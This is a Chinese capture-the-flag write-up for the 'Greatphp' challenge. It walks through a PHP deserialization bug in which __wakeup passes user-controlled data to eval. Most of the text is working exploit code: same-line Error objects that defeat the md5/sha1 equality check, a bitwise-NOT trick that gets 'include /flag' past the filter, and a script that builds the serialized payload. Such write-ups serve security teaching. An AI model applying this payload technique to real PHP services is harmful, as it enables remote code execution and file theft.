# [极客大挑战 2020]Greatphp
![](<./img/Pasted image 20230217114125.png>)

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

好消息——是反序列化
坏消息——考的不是反序列化

需要绕过`md5`和`sha1`的比较，第一个想到的是数组绕过，但是`syc`需要作为`eval`的参数，因此需要不能为数组

这里利用`Error`类绕过，其通过`__toString`魔术方法定义了隐式转换为字符串的方法，通过创建两个向字符串隐式转换结果相同的`Error`对象，即可令`md5`和`sha1`的结果相同，同时改变不影响转换结果的`Error`的某个属性，即可在此基础上使两个`Error`对象的弱相等比较结果为假

```php
<?php
$a = new Error("php_wa_sai_kou!", 233);
echo $a;
```

```
Error: php_wa_sai_kou! in /home/chen/proj/php/demo/index.php:2
Stack trace:
#0 {main}
```

创建一个简单的`Error`对象，观察到影响字符串表示的只有创建`Error`对象时的当前行号以及传递的错误消息

因此将两个创建`Error`对象的语句放在同一行，令错误消息相同，但错误码不同即可绕过棘手的相等性判断

```php
<?php
$a = new Error("php_wa_sai_kou!", 233); $b = new Error("php_wa_sai_kou!");
echo $a != $b && md5($a) === md5($b) && sha1($a) === sha1($b);
```

```
1
```

由于`Error`对象的字符串表示包含了杂七杂八的信息，因此简单地将要执行的代码作为错误消息构造出来的`Error`对象转换为字符串后并不能被`eval`正确执行

考虑到`eval`的实现利用了字符串拼接，可以通过`php`标签将各个部分隔离起来

```php
<?php
$message = "?><?php echo 'php_wa_sai_kou!';?>";
$err = new Error($message);
eval($err);
```

```
php_wa_sai_kou! in /home/chen/proj/php/demo/index.php:3
Stack trace:
#0 {main}
```

```php
if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)) {...}
```

这里过滤了双引号和左右括号，因此使用`include`关键字包含`/flag`，同时利用取反绕过

```php
<?php
$message = "?><?php include ~" . ~"/flag" . "?>";
$err = new Error($message);
eval($err);
```

![](<./img/Pasted image 20230217143303.png>)

最后序列化即可

```php
<?php

class SYCLOVER
{
    public $syc;
    public $lover;
}

$message = "?><?= include ~" . ~"/flag" . "?>";
$err1 = new Error($message, 1); $err2 = new Error($message, 2);

$payload = new SYCLOVER();
$payload->syc = $err1;
$payload->lover = $err2;

echo urlencode(serialize($payload));
```

![](<./img/Pasted image 20230217150313.png>)
